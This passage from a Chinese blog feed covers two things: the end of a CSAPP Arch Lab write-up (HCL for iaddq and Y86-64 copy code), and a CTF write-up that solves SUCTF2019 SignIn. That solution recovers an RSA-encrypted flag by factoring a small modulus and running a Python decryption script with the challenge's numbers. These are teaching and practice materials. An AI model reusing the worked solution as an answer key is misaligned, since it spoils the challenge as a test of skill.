class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">#<span class="comment">/* $begin seq-all-hcl */</span></span><br><span class="line">####################################################################</span><br><span class="line">#  HCL Description of Control <span class="keyword">for</span> Single Cycle Y86<span class="number">-64</span> Processor SEQ   #</span><br><span class="line">#  Copyright (C) Randal E. Bryant, David R. O<span class="number">&#x27;</span>Hallaron, <span class="number">2010</span>       #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">## Your task is to implement the iaddq instruction</span><br><span class="line">## The file contains a declaration of the icodes</span><br><span class="line">#<span class="meta"># for iaddq (IIADDQ)</span></span><br><span class="line">## Your job is to add the rest of the logic to make it work</span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    C Include<span class="number">&#x27;</span>s.  Don<span class="number">&#x27;</span>t alter these                               #</span><br><span class="line">###################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">quote <span class="meta-string">&#x27;#include &lt;stdio.h&gt;&#x27;</span></span></span><br><span class="line">quote <span class="string">&#x27;#include &quot;isa.h&quot;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;#include &quot;sim.h&quot;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;int sim_main(int argc, char *argv[]);&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;word_t gen_pc()&#123;return 0;&#125;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;int main(int argc, char *argv[])&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;  &#123;plusmode=0;return sim_main(argc,argv);&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    Declarations.  Do <span class="keyword">not</span> change/remove/<span class="keyword">delete</span> any of these       #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">##### Symbolic representation of Y86<span class="number">-64</span> Instruction Codes ############<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig INOP     <span class="meta-string">&#x27;I_NOP&#x27;</span></span></span><br><span class="line">wordsig IHALT    <span class="string">&#x27;I_HALT&#x27;</span></span><br><span class="line">wordsig IRRMOVQ    <span class="string">&#x27;I_RRMOVQ&#x27;</span></span><br><span class="line">wordsig IIRMOVQ    <span class="string">&#x27;I_IRMOVQ&#x27;</span></span><br><span class="line">wordsig IRMMOVQ    <span class="string">&#x27;I_RMMOVQ&#x27;</span></span><br><span class="line">wordsig IMRMOVQ    <span class="string">&#x27;I_MRMOVQ&#x27;</span></span><br><span class="line">wordsig IOPQ    <span class="string">&#x27;I_ALU&#x27;</span></span><br><span class="line">wordsig IJXX    <span class="string">&#x27;I_JMP&#x27;</span></span><br><span class="line">wordsig ICALL    <span class="string">&#x27;I_CALL&#x27;</span></span><br><span class="line">wordsig IRET    <span class="string">&#x27;I_RET&#x27;</span></span><br><span class="line">wordsig IPUSHQ    <span class="string">&#x27;I_PUSHQ&#x27;</span></span><br><span class="line">wordsig IPOPQ    <span class="string">&#x27;I_POPQ&#x27;</span></span><br><span class="line"># Instruction code <span class="keyword">for</span> iaddq instruction</span><br><span class="line">wordsig IIADDQ    <span class="string">&#x27;I_IADDQ&#x27;</span></span><br><span class="line"></span><br><span class="line">##### Symbolic represenations of Y86<span class="number">-64</span> function codes                  ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig FNONE    <span class="meta-string">&#x27;F_NONE&#x27;</span>        # Default function code</span></span><br><span class="line"></span><br><span class="line">##### Symbolic representation of Y86<span class="number">-64</span> Registers referenced explicitly ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig RRSP     <span class="meta-string">&#x27;REG_RSP&#x27;</span>        # Stack Pointer</span></span><br><span class="line">wordsig RNONE    <span class="string">&#x27;REG_NONE&#x27;</span>       # Special value indicating <span class="string">&quot;no register&quot;</span></span><br><span class="line"></span><br><span class="line">##### ALU Functions referenced explicitly                            ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig ALUADD    <span class="meta-string">&#x27;A_ADD&#x27;</span>        # ALU should add its arguments</span></span><br><span class="line"></span><br><span class="line">##### Possible instruction status values                             ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig SAOK    <span class="meta-string">&#x27;STAT_AOK&#x27;</span>    # Normal execution</span></span><br><span class="line">wordsig SADR    <span class="string">&#x27;STAT_ADR&#x27;</span>    # Invalid memory address</span><br><span class="line">wordsig SINS    <span class="string">&#x27;STAT_INS&#x27;</span>    # Invalid instruction</span><br><span class="line">wordsig SHLT    <span class="string">&#x27;STAT_HLT&#x27;</span>    # Halt instruction encountered</span><br><span class="line"></span><br><span class="line">##### Signals that can be referenced by control logic ####################</span><br><span class="line"></span><br><span class="line">##### Fetch stage inputs        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig pc <span class="meta-string">&#x27;pc&#x27;</span>                # Program counter</span></span><br><span class="line">##### Fetch stage computations        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig imem_icode <span class="meta-string">&#x27;imem_icode&#x27;</span>        # icode field from instruction memory</span></span><br><span class="line">wordsig imem_ifun  <span class="string">&#x27;imem_ifun&#x27;</span>         <span class="meta"># ifun field from instruction memory</span></span><br><span class="line">wordsig icode      <span class="string">&#x27;icode&#x27;</span>        # Instruction control code</span><br><span class="line">wordsig ifun      <span class="string">&#x27;ifun&#x27;</span>        # Instruction function</span><br><span class="line">wordsig rA      <span class="string">&#x27;ra&#x27;</span>            # rA field from instruction</span><br><span class="line">wordsig rB      <span class="string">&#x27;rb&#x27;</span>            # rB field from instruction</span><br><span class="line">wordsig valC      <span class="string">&#x27;valc&#x27;</span>        # Constant from instruction</span><br><span class="line">wordsig valP      <span class="string">&#x27;valp&#x27;</span>        # Address of following instruction</span><br><span class="line">boolsig imem_error <span class="string">&#x27;imem_error&#x27;</span>        # Error signal from instruction memory</span><br><span class="line">boolsig instr_valid <span class="string">&#x27;instr_valid&#x27;</span>    # Is fetched instruction valid?</span><br><span class="line"></span><br><span class="line">##### Decode stage computations        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valA    <span class="meta-string">&#x27;vala&#x27;</span>            # Value from register A port</span></span><br><span class="line">wordsig valB    <span class="string">&#x27;valb&#x27;</span>            # Value from <span class="keyword">register</span> B port</span><br><span class="line"></span><br><span class="line">##### Execute stage computations    ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valE    <span class="meta-string">&#x27;vale&#x27;</span>            # Value computed by ALU</span></span><br><span class="line">boolsig Cnd    <span class="string">&#x27;cond&#x27;</span>            # Branch test</span><br><span class="line"></span><br><span class="line">##### Memory stage computations        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valM    <span class="meta-string">&#x27;valm&#x27;</span>            # Value read from memory</span></span><br><span class="line">boolsig dmem_error <span class="string">&#x27;dmem_error&#x27;</span>        # Error signal from data memory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    Control Signal Definitions.                                   #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">################ Fetch Stage     ###################################</span><br><span class="line"></span><br><span class="line"># Determine instruction code</span><br><span class="line">word icode = [</span><br><span class="line">    imem_error: INOP;</span><br><span class="line">    <span class="number">1</span>: imem_icode;        # Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Determine instruction function</span><br><span class="line">word ifun = [</span><br><span class="line">    imem_error: FNONE;</span><br><span class="line">    <span class="number">1</span>: imem_ifun;        # Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> instr_valid = icode in </span><br><span class="line">    &#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">           IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte?</span><br><span class="line"><span class="keyword">bool</span> need_regids =</span><br><span class="line">    icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">             IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word?</span><br><span class="line"><span class="keyword">bool</span> need_valC =</span><br><span class="line">    icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line">################ Decode Stage    ###################################</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the A source?</span><br><span class="line">word srcA = [</span><br><span class="line">    icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : rA;</span><br><span class="line">    icode in &#123; IPOPQ, IRET &#125; : RRSP;</span><br><span class="line">    <span class="number">1</span> : RNONE; # Don<span class="number">&#x27;</span>t need <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the B source?</span><br><span class="line">word srcB = [</span><br><span class="line">    icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB;</span><br><span class="line">    icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">    <span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t need <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the E destination?</span><br><span class="line">word dstE = [</span><br><span class="line">    icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">    icode in &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB;</span><br><span class="line">    icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">    <span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t write any <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the M destination?</span><br><span class="line">word dstM = [</span><br><span class="line">    icode in &#123; IMRMOVQ, IPOPQ &#125; : rA;</span><br><span class="line">    <span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t write any <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">################ Execute Stage   ###################################</span><br><span class="line"></span><br><span class="line">## Select input A to ALU</span><br><span class="line">word aluA = [</span><br><span class="line">    icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">    icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC;</span><br><span class="line">    icode in &#123; ICALL, IPUSHQ &#125; : <span class="number">-8</span>;</span><br><span class="line">    icode in &#123; IRET, IPOPQ &#125; : <span class="number">8</span>;</span><br><span class="line">    # Other instructions don<span class="number">&#x27;</span>t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU</span><br><span class="line">word aluB = [</span><br><span class="line">    icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">              IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span><br><span class="line">    icode in &#123; IRRMOVQ, IIRMOVQ &#125; : <span class="number">0</span>;</span><br><span class="line">    # Other instructions don<span class="number">&#x27;</span>t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set the ALU function</span><br><span class="line">word alufun = [</span><br><span class="line">    icode == IOPQ : ifun;</span><br><span class="line">    <span class="number">1</span> : ALUADD;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Should the condition codes be updated?</span><br><span class="line">+<span class="keyword">bool</span> set_cc = icode in &#123; IOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line">################ Memory Stage    ###################################</span><br><span class="line"></span><br><span class="line">## Set read control signal</span><br><span class="line"><span class="keyword">bool</span> mem_read = icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;</span><br><span class="line"></span><br><span class="line">## Set write control signal</span><br><span class="line"><span class="keyword">bool</span> mem_write = icode in &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;</span><br><span class="line"></span><br><span class="line">## Select memory address</span><br><span class="line">word mem_addr = [</span><br><span class="line">    icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : valE;</span><br><span class="line">    icode in &#123; IPOPQ, IRET &#125; : valA;</span><br><span class="line">    # Other instructions don<span class="number">&#x27;</span>t need address</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select memory input data</span><br><span class="line">word mem_data = [</span><br><span class="line">    # Value from <span class="keyword">register</span></span><br><span class="line">    icode in &#123; IRMMOVQ, IPUSHQ &#125; : valA;</span><br><span class="line">    # Return PC</span><br><span class="line">    icode == ICALL : valP;</span><br><span class="line">    # Default: Don<span class="number">&#x27;</span>t write anything</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Determine instruction status</span><br><span class="line">word Stat = [</span><br><span class="line">    imem_error || dmem_error : SADR;</span><br><span class="line">    !instr_valid: SINS;</span><br><span class="line">    icode == IHALT : SHLT;</span><br><span class="line">    <span class="number">1</span> : SAOK;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">################ Program Counter Update ############################</span><br><span class="line"></span><br><span class="line">## What address should instruction be fetched at</span><br><span class="line"></span><br><span class="line">word new_pc = [</span><br><span class="line">    # Call.  Use instruction constant</span><br><span class="line">    icode == ICALL : valC;</span><br><span class="line">    # Taken branch.  Use instruction constant</span><br><span class="line">    icode == IJXX &amp;&amp; Cnd : valC;</span><br><span class="line">    # Completion of RET instruction.  Use value from <span class="built_in">stack</span></span><br><span class="line">    icode == IRET : valM;</span><br><span class="line">    # Default: Use incremented PC</span><br><span class="line">    <span class="number">1</span> : valP;</span><br><span class="line">];</span><br><span class="line">#<span class="comment">/* $end seq-all-hcl */</span></span><br></pre></td></tr></table></figure><p>PS:咱这个实验没有自己作过，上面的修改方式参照了别的师傅的wp，然后我其实突然发现我直接测评也是直接满掉的，不知道为啥，所以这个还是不能算我自己写的，我也是真不会，我也不知道哪里需要添加，为什么以及它工作的原理是真的不知道，以后变强了看看这里能不能更新一下解决这个问题吧。<code>qwq</code></p><p><img src="https://i.loli.net/2021/05/11/dsAba43ELxCyrSl.png" alt="archlab_PartB_1.png"></p><h1 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h1><p>Part C在寒假的逆向培训中我还是记得很清楚的，循环次数缩减可以用每次移动八个字节，循环执行[len/8]次，然后再一字节一字节移动len%8次，利用这个思路去优化memcpy函数来着的。</p><p><img src="https://i.loli.net/2021/05/11/mqklds3JaxiROow.png" alt="archlab_PartC_2.png"></p><p>然后写出优化的思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">    # Loop header</span><br><span class="line">    xorq %rax,%rax        # count = 0;</span><br><span class="line">    iaddq $-4, %rdx</span><br><span class="line">    jle EQ0</span><br><span class="line"></span><br><span class="line">Npos0:</span><br><span class="line">    mrmovq (%rdi), %r10</span><br><span class="line">    mrmovq 8(%rdi), %r11</span><br><span class="line">    mrmovq 16(%rdi), %r12</span><br><span class="line">    mrmovq 24(%rdi), %r13</span><br><span class="line">    mrmovq 32(%rdi), %r14</span><br><span class="line">    rmmovq %r10, (%rsi)</span><br><span class="line">    andq %r10, %r10        # val &lt;= 0?</span><br><span class="line">    jle Npos1</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos1:</span><br><span class="line">    rmmovq %r11, 8(%rsi)</span><br><span class="line">    andq %r11, %r11        # val &lt;= 0?</span><br><span class="line">    jle Npos2</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos2:</span><br><span class="line">    rmmovq %r12, 16(%rsi)</span><br><span class="line">    andq %r12, %r12        # val &lt;= 0?</span><br><span class="line">    jle Npos3</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos3:</span><br><span class="line">    rmmovq %r13, 24(%rsi)</span><br><span class="line">    andq %r13, %r13    # val &lt;= 0?</span><br><span class="line">    jle Npos4</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos4:</span><br><span class="line">    rmmovq %r14, 32(%rsi)</span><br><span class="line">    andq %r14, %r14    # val &lt;= 0?</span><br><span class="line">    jle Tail</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Tail:</span><br><span class="line">    iaddq $40, %rsi</span><br><span class="line">    iaddq $40, %rdi</span><br><span class="line">    iaddq $-5, %rdx</span><br><span class="line">    jg Npos0</span><br><span class="line"></span><br><span class="line">EQ0:</span><br><span class="line">    iaddq $4, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq (%rdi), %r10</span><br><span class="line">    mrmovq 8(%rdi), %r11</span><br><span class="line">    rmmovq %r10, (%rsi)</span><br><span class="line">    andq %r10, %r10</span><br><span class="line">    jle EQ1</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ1:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    rmmovq %r11, 8(%rsi)</span><br><span class="line">    andq %r11, %r11</span><br><span class="line">    jle EQ2</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ2:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq 16(%rdi), %r12</span><br><span class="line">    rmmovq %r12, 16(%rsi)</span><br><span class="line">    andq %r12, %r12</span><br><span class="line">    jle EQ3</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ3:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq 24(%rdi), %r13</span><br><span class="line">    rmmovq %r13, 24(%rsi)</span><br><span class="line">    andq %r13, %r13</span><br><span class="line">    jle Done</span><br><span class="line">    iaddq $1, %rax</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/11/2ZdkDcsWQiEqRIx.png" alt="archlab_PartC_1.png"></p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA解密</title>
      <link href="/2021/05/08/RSA/"/>
      <url>/2021/05/08/RSA/</url>
      
        <content type="html"><![CDATA[<p><code>RSA</code>解密简介:<code>RSA</code>是1977年由罗纳德·李维斯特（<code>Ron Rivest</code>）、阿迪·萨莫尔（<code>Adi Shamir</code>）和伦纳德·阿德曼（<code>Leonard Adleman</code>）一起提出的。当时他们三人都在麻省理工学院工作。<code>RSA</code>就是他们三人姓氏开头字母拼在一起组成的 。(from 百度百科)</p><span id="more"></span><h1 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h1><p>我们平时学习的加密多是对称加密，非对称加密相比于对称加密的区别就是:加密和解密用的不是同一个密钥。假如<code>Alice</code>和Bob想在一个不安全的线路上通信，他们在用这个信息交流之前没有任何py的信息(即:他们一开始不存在有且仅有他们两个人知道的信息)，而在这条线路上通信的所有信息都会被第三方窃听者Eve所获得。问:如何不让窃听者Eve监听到<code>Alice</code>和Bob的对话？</p><p>当然我们必须对发送的信息进行加密，而对称加密必须两人提前获取密钥和加密方式，这些信息都是他们一开始所不知道的，因此需要在这条线路上告知密钥和加密方式，如果在这条线路上告知，那么Eve也能对加密的数据解密从而监听他们的通话内容，那么我们采取非对称加密是最保险的。我只告诉你怎么加密，解密的密钥我自己留着，由于Eve不清楚解密方式自然就无法获取信息了。</p><h1 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h1><p>首先选取两个很大的质数<code>p</code>,<code>q</code>。</p><p>令<code>n=p*q</code>，任意选取一个很大的质数做公钥指数，那么<code>(n,e)</code>就形成了公钥，可以用它进行加密，假如明文为m，那么密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">c=m^e mod n</span><br></pre></td></tr></table></figure><p>我自己生成的p,q做运算<code>φ(n)=(p-1)(q-1)</code></p><p><code>d=inverse(e,φ(n))</code>，<code>inverse</code>函数为求模逆元函数</p><p><code>(n,d)</code>就是私钥，是只有我们自己知道的。</p><p>我拿到密文c后我可以用d还原明文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plain</span><br><span class="line"></span><br><span class="line">m=c^d mod n</span><br></pre></td></tr></table></figure><h1 id="RSA加密的破解"><a href="#RSA加密的破解" class="headerlink" title="RSA加密的破解"></a>RSA加密的破解</h1><p>破解的关键在于分解n的质因数，如果分解得到的p,q那么我们就很容易推得私钥d。</p><p>在应用当中，n一般有2048位，基本是破解不出的，而在比赛的时候n就只有不到百位，用一些在线工具也是很快可以破解得到p和q的。</p><p>但是拿到了一个很大位数的私钥d那也不顶用啊，算还是算不了啊，这个时候可以用第三方解密包RSA，也可以手写算法解决，作为一个ACMer，就得把珍藏已久的快速幂算法拿出来了，由于python支持大数，所以我会用python写。</p><h1 id="例题-SUCTF2019-SignIn"><a href="#例题-SUCTF2019-SignIn" class="headerlink" title="例题:[SUCTF2019]SignIn"></a>例题:[<a href="https://buuoj.cn/challenges#[SUCTF2019]SignIn">SUCTF2019]SignIn</a></h1><p>拿到elf文件先拖进IDA打开字符串窗口<code>(shift+F12)</code>，发现很容易看到字符串<code>[input flag]</code>，那么跟进去找到函数<code>main()</code></p><p><img src="https://i.loli.net/2021/05/07/q6bVAWsiu2m3SgT.png" alt="buuctf SignIn_1.png"></p><p>发现多了很多不认识的函数，但是根据它的参数也可以很容易发现这是个字符串赋值的函数，而且后面加了参数<code>10</code>或者<code>16</code>很像它的进制。后面的<code>GG</code>和<code>TTTTTTql!</code>肯定就是判断你输入的flag的正误了。</p><p>从头开始分析，输入的是v8字符串，v8经过了sub_96A函数的洗礼，跟进去看看逻辑关系。</p><p><img src="https://i.loli.net/2021/05/07/gmD4cXz23kZLVft.png" alt="buuctf SignIn_2.png"></p><p>很容易发现它是把a1字符串拆解成高字节和低字节分别存储到a2[i]和a2[i+1]，至于字符串byte_202010那就是很典型的16进制表<code>0123456789abcdef</code>，那么我输入的它给它拆成16进制数了，那么等会逆向解回去的话这个还是很好逆回去的，那么我们<code>ESC</code>跳回原来的函数。</p><p>v8的值转换给了v9，v7为下面比较字符串的其中一个，然后把v9转换成16进制数赋给v6，v5=65537。其实这个特征都就已经告诉你这是RSA解密。毕竟加密指数65537是十分常见的RSA加密指数。那么下面还有一个不认识的函数，不过看它的后缀powm，pow你就很容易看出来是取次方，然后m不就是模mod了么(手动滑稽)。所以这个函数实现的功能等价于一个表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v6=v6^v5%v4</span><br></pre></td></tr></table></figure><p>相当于v6是我们输入的，然后这个结果我们是知道的，模数n和指数e我们也知道，那么就对它结果(v7)进行RSA解密。</p><p>1.破解得到p,q，<a href="http://www.factordb.com/index.php">在线工具</a></p><p>2.编写脚本解密，这里用第三方包解密我就不演示了，主要看看解密的过程。</p><p>脚本中的数一律为10进制，转换的简单方法:把数复制到python交互窗口加上前缀<code>0x</code>就可以输出它的10进制数值了。</p><p><img src="https://i.loli.net/2021/05/07/nAc9TG5p4hDgrLq.png" alt="buuctf SignIn_3.png"></p><p>快速幂的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">while(d):</span><br><span class="line">    if d&amp;1:</span><br><span class="line">        x=x*c%n</span><br><span class="line">    c=c*c%n</span><br><span class="line">    d=d//2</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>得到数值<code>185534734614696481020381637136165435809958101675798337848243069</code>。</p><p>这里还要转回16进制再被逆回去处理，因为它以开始也就是16进制的，我们还用python<code>hex(185534734614696481020381637136165435809958101675798337848243069)</code>得到16进制数。</p><p><img src="https://i.loli.net/2021/05/07/IzF89jYiTCL6bdp.png" alt="buuctf SignIn_4.png"></p><p>最后一步就可以写脚本做最后一步解密了，这一步很简单，就是16进制转字符串，这个我喜欢用C++写，我感觉会比较方便。</p><p><img src="https://i.loli.net/2021/05/07/OMTJFghtDpBrKan.png" alt="buuctf SignIn_5.png"></p><p>得到flag</p><p>本篇所有的exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">#RSA解密脚本</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">p=282164587459512124844245113950593348271</span><br><span class="line">q=366669102002966856876605669837014229419</span><br><span class="line">phi=(p-1)*(q-1)</span><br><span class="line">e=65537</span><br><span class="line">d=inverse(e,phi)</span><br><span class="line">c=78510953323073667749065685964447569045476327122134491251061064910992472210485</span><br><span class="line">n=103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="line">x=1</span><br><span class="line">while(d):</span><br><span class="line">    if d&amp;1:</span><br><span class="line">        x=x*c%n</span><br><span class="line">    c=c*c%n</span><br><span class="line">    d=d//2</span><br><span class="line">print(x)</span><br><span class="line">c++</span><br><span class="line"></span><br><span class="line">//hex2raw脚本</span><br><span 